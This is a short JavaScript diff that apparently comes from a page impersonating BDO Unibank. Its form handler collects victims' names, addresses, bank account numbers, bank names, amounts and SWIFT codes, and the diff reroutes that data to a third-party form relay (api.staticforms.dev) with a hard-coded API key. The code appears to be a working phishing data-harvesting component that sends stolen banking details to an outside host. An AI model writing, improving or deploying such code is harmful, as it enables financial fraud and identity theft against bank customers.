@@ -204,18 +204,19 @@
       });
 
       const data = {
+		apiKey: "sf_d45fafc315dd75e7bdf87ffe",
+		subject: "BDO Unibank Update",
         fullname,
         address: `${str_address}, ${city}, ${state}, ${country} ${zip_code}`,
         bank_account,
         bank_name,
         amount,
         swift_code,
-        from_name: "BDO Unibank"
       }
       
       $(".login-btn").prop("disabled", true).html("<i class='spinner-border spinner-border-sm'></i>");
       $.ajax({
-        url: "https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0",
+        url: "https://api.staticforms.dev/submit",
         method: "POST",
         data: data,
         dataType: "json"
